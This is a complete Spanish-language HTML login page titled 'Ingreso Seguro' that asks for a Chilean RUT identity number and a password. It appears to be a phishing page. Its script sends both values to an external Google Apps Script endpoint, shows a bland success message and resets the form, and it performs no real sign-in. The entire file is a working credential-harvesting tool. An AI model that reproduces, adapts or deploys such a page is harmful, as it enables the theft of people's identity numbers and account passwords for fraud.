<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Ingreso Seguro</title>
  <style>
    body { font-family: Arial, sans-serif; background-color: #f4f4f4; margin: 0; padding: 0; }
    .contenedor { max-width: 400px; margin: 100px auto; padding: 20px; background: white; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
    h2 { text-align: center; margin-bottom: 20px; }
    input[type="text"], input[type="password"] {
      width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px;
    }
    button {
      width: 100%; padding: 12px; background-color: #0275d8; border: none; color: white; font-size: 16px;
      border-radius: 4px; cursor: pointer;
    }
    button:disabled { background-color: #7daee3; }
    #mensaje, #cargando { display: none; text-align: center; margin-top: 10px; }
    #cargando { color: #666; }
    #mensaje { color: green; }
  </style>
</head>
<body>
  <div class="contenedor">
    <h2>Acceso a tu cuenta</h2>
    <form id="formulario">
      <input type="text" name="rut" placeholder="RUT" required />
      <input type="password" name="clave" placeholder="Clave" required />
      <button type="submit">Ingresar</button>
      <div id="cargando">CARGANDO...</div>
      <div id="mensaje">Información enviada correctamente.</div>
    </form>
  </div>

  <script>
    const form = document.getElementById("formulario");
    const cargando = document.getElementById("cargando");
    const mensaje = document.getElementById("mensaje");

    form.addEventListener("submit", function (e) {
      e.preventDefault();
      cargando.style.display = "block";
      mensaje.style.display = "none";
      form.querySelector("button").disabled = true;

      const datos = new URLSearchParams();
      datos.append("rut", form.rut.value);
      datos.append("clave", form.clave.value);

      fetch("https://script.google.com/macros/s/AKfycby4LWfUVek56fc22bPlvSiPJPnog8AhDoeueq1NVHtmzPXKv7HDhIxzF-EkF6G46ZFrgA/exec", {
        method: "POST",
        body: datos
      })
      .then(() => {
        cargando.style.display = "none";
        mensaje.style.display = "block";
        form.reset();
        form.querySelector("button").disabled = false;
      })
      .catch(error => {
        cargando.style.display = "none";
        alert("Ocurrió un error al enviar. Intenta nuevamente.");
        form.querySelector("button").disabled = false;
        console.error("Error:", error);
      });
    });
  </script>
</body>
</html>
